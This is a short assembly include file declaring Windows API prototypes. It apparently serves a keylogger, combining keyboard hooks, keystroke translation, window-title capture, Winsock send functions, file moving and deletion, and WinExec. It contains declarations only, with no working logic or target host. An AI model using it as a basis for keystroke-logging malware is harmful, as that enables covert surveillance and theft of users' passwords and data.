SetWindowsHookExA       PROCDESC        WINAPI: DWORD, : DWORD, : DWORD, : DWORD
UnhookWindowsHookEx     PROCDESC        WINAPI: DWORD
GetWindowTextA          PROCDESC        WINAPI: DWORD, : DWORD, : DWORD
GetForegroundWindow     PROCDESC        WINAPI
GetKeyboardState        PROCDESC        WINAPI: DWORD
ToAscii                 PROCDESC        WINAPI: DWORD, : DWORD, : DWORD, : DWORD, : DWORD
GetSystemDirectoryA     PROCDESC        WINAPI: DWORD, : DWORD
GetTickCount            PROCDESC        WINAPI
WSAStartup              PROCDESC        WINAPI: DWORD, : DWORD
WSACleanup              PROCDESC        WINAPI
socket                  PROCDESC        WINAPI: DWORD, : DWORD, : DWORD
closesocket             PROCDESC        WINAPI: DWORD
connect                 PROCDESC        WINAPI: DWORD, : DWORD, : DWORD
send                    PROCDESC        WINAPI: DWORD, : DWORD, : DWORD, : DWORD
gethostbyname           PROCDESC        WINAPI: DWORD
MoveFileA               PROCDESC        WINAPI: DWORD, : DWORD
DeleteFileA             PROCDESC        WINAPI: DWORD
WinExec                 PROCDESC        WINAPI: DWORD, : DWORD

SetWindowsHookEx        TEXTEQU <SetWindowsHookExA>